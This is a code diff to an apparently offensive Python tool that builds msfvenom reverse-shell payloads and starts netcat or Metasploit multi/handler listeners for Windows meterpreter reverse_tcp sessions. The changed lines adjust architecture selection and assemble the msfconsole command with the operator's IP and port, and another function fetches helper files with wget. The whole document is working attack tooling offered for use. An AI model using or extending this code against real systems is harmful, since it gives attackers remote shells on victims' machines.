@@ -23,7 +23,6 @@ payload = args.payload.lower()
 
 arch = str(args.architecture).lower()
 
-
 try:
     int(args.port)
 except:
@@ -42,8 +41,12 @@ def nc_list(port = args.port, payload = payload):
 def msf_list(IP = Get_IP(), PORT = args.port):
     print(blue('Setting up your listener in metasploit.\n'))
     print(green('Waiting to say I\'m in...\n'))
-    command = 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp;set LHOST ' + IP + ';set LPORT ' + PORT + '; exploit" 2>/dev/null'
-    if arch == 'x86' or arch == '86':
+    command = 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp ;set LHOST ' + IP + ' ;set LPORT ' + PORT + ' ; exploit" 2>/dev/null'
+    if (arch == 'x86' or arch == '86') and (payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll'):
+        command = command.replace('/x64', '')
+        os.system(command)
+        exit()
+    elif arch == 'x86' or arch == '86':
         command = command.replace('x64', 'x86')
     if payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll':
         os.system(command)
@@ -66,7 +69,7 @@ def Check_files(file):
         os.system('wget ' + filelink[file] + ' -O ' + path + file + ' 2>/dev/null')
         print(blue(file) + green(' downloaded.\n'))
 
-def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, sys='64'):
+def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
     if payload.isnumeric():
         print(red('The payload must be a string.'))
         exit()
@@ -75,7 +78,9 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, sys='64'):
 
     if msf == True:
         msfvenom = msfvenom.replace('shell_', 'meterpreter/')
-    if sys == 'x86' or sys == '86':
+    if (arch == 'x86' or arch == '86') and (payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll'):
+        msfvenom = msfvenom.replace('/x64', '')
+    elif arch == 'x86' or arch == '86':
         msfvenom = msfvenom.replace('x64', 'x86')
 
     if payload == 'oldnc':
@@ -129,14 +134,20 @@ if args.listener != None:
         print(red('The port is already in use.'))
         exit()
     if args.listener == 'nc' or args.listener == 'netcat':
-        Configure()
+        if arch == 'none':
+            Configure(arch = arch)
+        else:
+            Configure()
         print(green('Waiting to say I\'m in...\n'))
         nc_list()
         exit()
     elif args.listener == 'msf' or args.listener == 'metasploit':
-        Configure(msf = True)
-        msf_list()
-        exit()
+        if arch == 'none':
+            Configure(msf = True)
+        else:
+            Configure(msf = True, arch = arch)
+            msf_list()
+            exit()
     else:
         print(red('Your listener option is not in the list, use "--help" to know the listeners list.'))
         exit()
